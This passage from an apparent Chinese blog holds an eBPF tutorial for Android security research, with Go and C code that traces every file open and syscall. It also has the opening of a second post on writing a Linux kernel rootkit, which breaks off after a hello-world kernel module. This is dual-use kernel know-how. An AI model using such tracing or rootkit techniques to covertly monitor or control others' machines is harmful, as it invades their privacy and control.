<p>   <strong>对比kernel hook，ebpf最大的优点在于安全和可移植性，在ebpf载入之前，需要经过验证器的验证，能够保证内核不会因为ebpf程序而出现崩溃，可移植性体现在多版本支持，屏蔽掉了底层的细节，能最大程度保证开发者将重心放在程序的逻辑性上；同样的，ebpf最大的缺点也体现在了为了保证安全的验证器上，例如循环次数有限制等，导致一些明明可以很简洁的操作在ebpf中编程时必须要使用很蠢的方法间接实现（ps：对kernel hook感兴趣的可以参考一下我之前的一篇文章<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1672531-1-1.html">https://www.52pojie.cn/thread-1672531-1-1.html</a>）</strong></p>
<hr>
<h2 id="二、运行环境"><a href="#二、运行环境" class="headerlink" title="二、运行环境"></a>二、运行环境</h2><p>   <strong>OS：Android模拟器pixel 6 API level 33 x86_64</strong></p>
<p>   <strong>kernel：5.15.41</strong></p>
<hr>
<h2 id="三、开发工具链"><a href="#三、开发工具链" class="headerlink" title="三、开发工具链"></a>三、开发工具链</h2><p>   <strong>ebpf常见的开发工具有如下一些：</strong></p>
<ul>
<li><p><code>bcc</code>：BCC 是一个框架，它允许用户编写 python 程序，并将 eBPF 程序嵌入其中。但是bcc想将bcc运行在android上时配置环境时相对麻烦，当然，环境配置好开发难度相比其他工具更低，同时，网上的资料相比其他工具也更多</p>
</li>
<li><p><code>libbpf</code>：libbpf 是一个基于 C 的库，包含一个 BPF 加载程序，该加载程序获取已编译的 BPF 目标文件并准备它们并将其加载到 Linux 内核中。 libbpf 承担了加载、验证 BPF 程序并将其附加到各种内核挂钩的繁重工作，使 BPF 应用程序开发人员能够只关注 BPF 程序的正确性和性能。官方链接：<a target="_blank" rel="noopener" href="https://github.com/libbpf/libbpf">https://github.com/libbpf/libbpf</a></p>
</li>
<li><p><code>cilium</code>：cilium是一个纯 Go 库，提供用于加载、编译和调试 eBPF 程序的实用程序。官方链接：<a target="_blank" rel="noopener" href="https://github.com/cilium/ebpf">https://github.com/cilium/ebpf</a></p>
</li>
<li><p><code>Android mk</code>：谷歌提供的android原生ebpf支撑，官方链接：<a target="_blank" rel="noopener" href="https://source.android.google.cn/docs/core/architecture/kernel/bpf?hl=zh-cn">https://source.android.google.cn/docs/core/architecture/kernel/bpf?hl=zh-cn</a></p>
<p> <strong>本系列文章均选择使用<code>cilium</code>，经过对比，<code>bcc</code>配置环境过于麻烦，不方便快速移植到其他设备上；<code>libbpf</code>和<code>cilium</code>对比起来，在内核层代码都是<code>c</code>写的，区别不大，但是在用户层代码上，<code>go</code>还是比<code>c</code>更方便编写；至于使用<code>android mk</code>的方式，其实最开始选用的是该方案，毕竟是<code>Android</code>的原生支持，不论是在数据结构上面还是在函数上面支持度相比较前面几个工具都是最优选择，缺点就是占用资源过大，性能不好的机器编译时长不是一般的长</strong></p>
</li>
</ul>
<hr>
<h2 id="四、ebpf中的数据传输"><a href="#四、ebpf中的数据传输" class="headerlink" title="四、ebpf中的数据传输"></a>四、ebpf中的数据传输</h2><p>   <strong>ebpf中内核和用户层之间的数据传输常用的框架有两种，分别是<code>perf</code>和<code>ringbuffer</code>，前者是从<code>kernel module</code>而来的，而后者是专门为<code>ebpf</code>定制的，体验性更好，所有一般都使用后者</strong>  </p>
<p>   <strong>在内核层，常规用法为首先使用<code>bpf_ringbuf_reserve</code>申请一个<code>buffer</code>，然后调用<code>bpf_ringbuf_submit</code>提交数据到缓冲区，更详细的可以参考文档<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/next/bpf/ringbuf.html">https://www.kernel.org/doc/html/next/bpf/ringbuf.html</a></strong></p>
<hr>
<h2 id="五、ebpf中的常见函数"><a href="#五、ebpf中的常见函数" class="headerlink" title="五、ebpf中的常见函数"></a>五、ebpf中的常见函数</h2><ul>
<li><code>bpf_printk</code>: ebpf内核层打印函数，用法和<code>printf</code>一致，该函数输出到了<code>/sys/kernel/tracing/trace_pipe</code>文件中(PS:有些系统是&#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;trace_pipe)，值得注意的是，要开启打印，需要将<code>/sys/kernel/tracing/tracing_on</code>的值置为1</li>
<li><code>bpf_probe_read_user_str</code>: 从用户空间读取字符串</li>
<li><code>bpf_probe_read</code>: 从内核空间读取内存, 以上函数用法都可以参考<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/bpf-helpers.7.html">https://man7.org/linux/man-pages/man7/bpf-helpers.7.html</a></li>
</ul>
<hr>
<h2 id="六、vmlinux-h"><a href="#六、vmlinux-h" class="headerlink" title="六、vmlinux.h"></a>六、vmlinux.h</h2><p>   <strong><code>vmlinux.h</code>是啥？<code>vmlinux.h</code>是由工具生成而来的，包含了该机器内核所有的数据结构，有了这个头文件，就避免了我们去官网上查询相应的数据结构，还能避免不同版本之间带来的数据结构变动的问题</strong></p>
<p>   <strong>通常我们使用<code>bpftool</code>去生成，命令为<code>bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</code></strong></p>
<p>   <strong><code>bpftool</code>的<code>github</code>链接为<a target="_blank" rel="noopener" href="https://github.com/libbpf/bpftool">https://github.com/libbpf/bpftool</a></strong></p>
<hr>
<h2 id="七、ebpf常见的事件类型"><a href="#七、ebpf常见的事件类型" class="headerlink" title="七、ebpf常见的事件类型"></a>七、ebpf常见的事件类型</h2><h3 id="7-1-kprobe"><a href="#7-1-kprobe" class="headerlink" title="7.1 kprobe"></a>7.1 kprobe</h3><p>   <strong><code>kprobe</code>可以简单理解为在内核插桩，目前有两种形式，分别是<code>kprobe</code>和<code>kretprobe</code>，前者是在函数开始处插桩，后者则是在函数返回之前插桩，使用举例如下：</strong></p>
<p><strong>内核层：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:build ignore</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmlinux.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> __license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_data</span> &#123;</span></span><br><span class="line">    u32 uid;</span><br><span class="line">    u8 filename[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_data</span> <span class="title">file</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type,BPF_MAP_TYPE_RINGBUF);</span><br><span class="line">    __uint(max_entries,<span class="number">1</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">unused</span> __<span class="title">attribute__</span>((<span class="title">unused</span>));</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;kprobe/do_sys_openat2&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">kprobe_openat</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    u32 uid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">openat2data</span>;</span></span><br><span class="line">    <span class="type">char</span> *fp = (<span class="type">char</span> *)(ctx-&gt;si);</span><br><span class="line">    </span><br><span class="line">    uid = bpf_get_current_uid_gid();</span><br><span class="line">        </span><br><span class="line">    openat2data = bpf_ringbuf_reserve(&amp;events,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> event),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!openat2data)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> res = bpf_probe_read_user_str(&amp;openat2data-&gt;file.filename,<span class="number">256</span>,fp);</span><br><span class="line">    bpf_printk(<span class="string">&quot;uid: %d, filename: %s&quot;</span>,uid,openat2data-&gt;file.filename);</span><br><span class="line">    openat2data-&gt;file.uid = uid;</span><br><span class="line">    bpf_ringbuf_submit(openat2data,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>用户层：</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/signal&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&quot;github.com/cilium/ebpf&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/cilium/ebpf/link&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/cilium/ebpf/rlimit&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/cilium/ebpf/ringbuf&quot;</span></span><br><span class="line">    <span class="string">&quot;golang.org/x/sys/unix&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -tags &quot;linux&quot; -type event --target=amd64 bpf blog.c -- -I./headers</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    stopper := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal,<span class="number">1</span>)</span><br><span class="line">    signal.Notify(stopper,os.Interrupt,syscall.SIGTERM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := rlimit.RemoveMemlock(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    objs := bpfObjects&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> err := loadBpfObjects(&amp;objs,<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> objs.Close()</span><br><span class="line">    </span><br><span class="line">    se, err := link.Kprobe(<span class="string">&quot;do_sys_openat2&quot;</span>,objs.KprobeOpenat,<span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> se.Close()</span><br><span class="line">    </span><br><span class="line">    rd, err := ringbuf.NewReader(objs.Events)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> rd.Close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        &lt;-stopper</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> err := rd.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    </span><br><span class="line">    log.Println(<span class="string">&quot;Waiting for Data&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> event bpfEvent</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        record, err := rd.Read()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> errors.Is(err,ringbuf.ErrClosed) &#123;</span><br><span class="line">                log.Println(<span class="string">&quot;Received signal, exiting...&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := binary.Read(bytes.NewBuffer(record.RawSample),binary.LittleEndian,&amp;event); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;[%+v]: filename -&gt; %s\n&quot;</span>,event.File.Uid,unix.ByteSliceToString(event.File.Filename[:]))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译：先<code>go generate</code>，然后<code>go build</code>即可</strong></p>
<p><strong>效果图如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/1.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/2.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/3.png"></p>
<p>   <strong>至于<code>kretprobe</code>，和<code>kprobe</code>区别不大，这里不在举例说明</strong></p>
<h3 id="7-2-tracepoint"><a href="#7-2-tracepoint" class="headerlink" title="7.2 tracepoint"></a>7.2 tracepoint</h3><p>   <strong><code>tracepoint</code>可以理解为是在源码中预埋的hook点位，相比较<code>kprobe</code>，稳定性被大大增强，当然缺点也很明显，那就是数量有限，没办法自定义，查看所有<code>tracepoint</code>可在<code>/sys/kernel/tracing/events/</code>目录下找到所有可追踪的事件(PS: 有些机器可能是在<code>/sys/kernel/debug/tracing/events/</code>下)，事件的格式信息在相应的事件目录下的<code>format</code>文件中</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/4.png"></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/5.png"></p>
<p><strong>内核层：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//go:build ignore</span><br><span class="line"></span><br><span class="line">#include &quot;vmlinux.h&quot;</span><br><span class="line"></span><br><span class="line">char __license[] SEC(&quot;license&quot;) = &quot;GPL&quot;;</span><br><span class="line"></span><br><span class="line">struct sys_enter_args &#123;</span><br><span class="line">   unsigned short common_type;</span><br><span class="line">   unsigned char common_flags;</span><br><span class="line">   unsigned char common_preempt_count;</span><br><span class="line">   int common_pid;</span><br><span class="line">   </span><br><span class="line">   long id;</span><br><span class="line">   unsigned long args[6];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(&quot;tracepoint/raw_syscalls/sys_enter&quot;)</span><br><span class="line">int trace_sys_enter(struct sys_enter_args *args)</span><br><span class="line">&#123;</span><br><span class="line">    u32 syscall_nr;</span><br><span class="line">    </span><br><span class="line">    syscall_nr = args-&gt;id;</span><br><span class="line">    </span><br><span class="line">    bpf_printk(&quot;syscall_nr: %d&quot;,syscall_nr);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>   <strong><code>bpf_printk</code>函数打印的结果在<code>/sys/kernel/tracing/trace_pipe</code>文件中(PS:有些机型在<code>/sys/kernel/debug/tracing/trace_pipe</code>文件中，下同，下面的不在重复解释)，观看<code>bpf_printk</code>函数结果需要先将<code>/sys/kernel/tracing/tracing_on</code>文件中的值置为<code>1</code></strong></p>
<p><strong>用户层：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/cilium/ebpf/link&quot;</span><br><span class="line">	&quot;github.com/cilium/ebpf/rlimit&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">//go:generate go run github.com/cilium/ebpf/cmd/bpf2go --target=amd64 bpf blog.c -- -I./headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	if err := rlimit.RemoveMemlock(); err != nil &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	objs := bpfObjects&#123;&#125;</span><br><span class="line">	if err := loadBpfObjects(&amp;objs, nil); err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;loading objects: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	defer objs.Close()</span><br><span class="line"></span><br><span class="line">	kp, err := link.Tracepoint(&quot;raw_syscalls&quot;,&quot;sys_enter&quot;,objs.TraceSysEnter,nil)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        defer kp.Close()</span><br><span class="line"></span><br><span class="line">	ticker := time.NewTicker(1 * time.Minute)</span><br><span class="line">	defer ticker.Stop()</span><br><span class="line"></span><br><span class="line">	log.Println(&quot;Waiting for events..&quot;)</span><br><span class="line"></span><br><span class="line">	for range ticker.C &#123;</span><br><span class="line">	    log.Printf(&quot;get rule\n&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>效果图如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/ebpf1/6.png"></p>
<h3 id="7-3-其他事件类型"><a href="#7-3-其他事件类型" class="headerlink" title="7.3 其他事件类型"></a>7.3 其他事件类型</h3><p>   <strong><code>ebpf</code>还有其他事件类型，例如<code>socket</code>、<code>sockops</code>、<code>tc</code>、<code>xdp</code>等等，但这些更多与流量控制息息相关，跟我们在移动安全上的关联性不是很大，这里不在举例说明，当然还有<code>uprobe</code>事件类型，这个是用户层插桩的，但用户层插桩更推荐<code>frida</code>这些框架，而且<code>uprobe</code>在<code>linux</code>使用体验感还好，在<code>Android</code>端使用去插桩<code>APP</code>过于麻烦了。</strong></p>
<hr>
<h2 id="八、一些使用技巧"><a href="#八、一些使用技巧" class="headerlink" title="八、一些使用技巧"></a>八、一些使用技巧</h2><h3 id="8-1-将数据从用户空间传输到内核空间"><a href="#8-1-将数据从用户空间传输到内核空间" class="headerlink" title="8.1 将数据从用户空间传输到内核空间"></a>8.1 将数据从用户空间传输到内核空间</h3><p>   <strong>在<code>cilium</code>中，<code>ringbuffer</code>并不支持将数据从用户空间传递到内核空间，只支持将数据从内核空间发送到用户空间，在新的数据传输框架<code>BPF_MAP_TYPE_USER_RINGBUF</code>支持将数据从用户空间传输到内核空间，但是遗憾的是，<code>cilium</code>暂不支持该框架</strong></p>
<p>   <strong>在我们需要传输一些过滤条件或者动态的全局配置到内核层去过滤的时候需要怎么做喃？可以考虑监控特定的文件名、特定的命令等来获取数据，当然这种方式仅时候传递数据量不大的情况</strong></p>
<h3 id="8-2-获取UID"><a href="#8-2-获取UID" class="headerlink" title="8.2 获取UID"></a>8.2 获取UID</h3><p>   <strong>UID是啥，UID是android中uid用于标识一个应用程序，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变，可以理解为app的唯一身份标识，在ebpf中，可以用来过滤指定app的数据</strong></p>
<p>   <strong><code>ebpf</code>可以使用<code>bpf_get_current_uid_gid</code>函数来获取UID，该函数返回值为<code>u32</code>类型</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2022/08/08/15/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/08/15/" class="post-title-link" itemprop="url">编写一个简单的linux kernel rootkit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-08 00:21:15" itemprop="dateCreated datePublished" datetime="2022-08-08T00:21:15+08:00">2022-08-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:14:22" itemprop="dateModified" datetime="2024-11-12T23:14:22+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>21 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>   <strong>linux kernel rootkit跟普通的应用层rootkit个人感觉不大，个人感觉区别在于一个运行在用户空间中，一个运行在内核空间中；另一个则是编写时调用的API跟应用层rootkit不同</strong>  </p>
<p>   <strong>一个最简单的linux kernel rootkit就是一个linux kernel module</strong>  </p>
<p>   <strong>PS：如有错误，请斧正</strong></p>
<hr>
<h1 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h1><pre><code>内核版本：5.4.0-120
攻击机：kal
靶机和编译机：ubuntu18 64位
</code></pre>
<hr>
<h1 id="三、linux-kernel-module"><a href="#三、linux-kernel-module" class="headerlink" title="三、linux kernel module"></a>三、linux kernel module</h1><p>   <strong>PS: linux kernel module编写网上资料很多，这里不在过多叙述</strong>  </p>
<p>   <strong>1、一个linux kernel module必备的函数为<code>module_init</code>和<code>module_exit</code>，前者为linux kernel module加载时调用的函数，后者为linux kernel module卸载时调用的函数，如下所示：</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure>

<p>   <strong>2、当然，也有其他<code>module</code>开头的函数，例如<code>ODULE_AUTHOR</code>声明作者等函数，但这些都是可选的</strong>  </p>
<p>   <strong>3、linux kernel module打印函数也跟用户态的<code>printf</code>函数不同，为<code>printk</code>函数，当然，也不会打印在终端中，通过<code>printk</code>打印的信息可通过<code>dmesg</code>命令查看</strong>  </p>
<p>   <strong>4、一个最简单的linux kernel module如下所示，其中<code>module_init</code>声明了模块加载时的函数<code>example_init</code>，<code>module_exit</code>声明了模块卸载时调用的函数函数<code>example_exit</code>，这个最简单的linux kernel module实现的功能就是在加载时和卸载时打印字符串</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;windy_ll&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Basic Kernel Module&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.01&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">example_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">example_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span 